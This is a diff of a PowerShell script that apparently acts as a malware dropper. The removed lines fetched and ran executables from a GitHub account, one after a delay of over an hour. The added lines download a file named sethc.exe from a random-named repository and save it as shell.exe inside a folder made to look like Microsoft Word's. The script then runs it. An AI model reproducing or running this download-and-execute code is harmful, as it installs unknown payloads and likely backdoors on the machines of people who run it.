@@ -1,22 +1,13 @@
-$checkPath = "$env:LOCALAPPDATA\DONOTDELETE.txt"
+$url = "https://github.com/webntdev/ipnqtxhsbvcmurjolgkfadzwey/raw/main/files/sethc.exe"
+$folderPath = "$env:USERPROFILE\AppData\Local\Microsoft\Word"
+$localPath = "$folderPath\shell.exe"
 
-if (Test-Path $checkPath) {
-    $undoApplicatie = "https://github.com/webntdev/webntdev.github.io/raw/main/Aplicatie/AplicatieUNDO.exe"
-    $undoPath = "$env:LOCALAPPDATA\ApplicatieUNDO.exe"
-
-    Invoke-WebRequest -Uri $undoApplicatie -OutFile $undoPath
-
-    Start-Sleep -Seconds 1
-
-    Start-Process -FilePath $undoPath
+if (-Not (Test-Path $folderPath)) {
+    New-Item -ItemType Directory -Path $folderPath
 }
-else {
-    $applicatie = "https://github.com/webntdev/webntdev.github.io/raw/main/Aplicatie/Aplicatie.exe"
-    $path = "$env:LOCALAPPDATA\Aplicatie.exe"
 
-    Invoke-WebRequest -Uri $applicatie -OutFile $path
-
-    Start-Sleep -Seconds 3900
-
-    Start-Process -FilePath $path
+if (-Not (Test-Path $localPath)) {
+    Invoke-WebRequest -Uri $url -OutFile $localPath
 }
+
+Start-Process $localPath
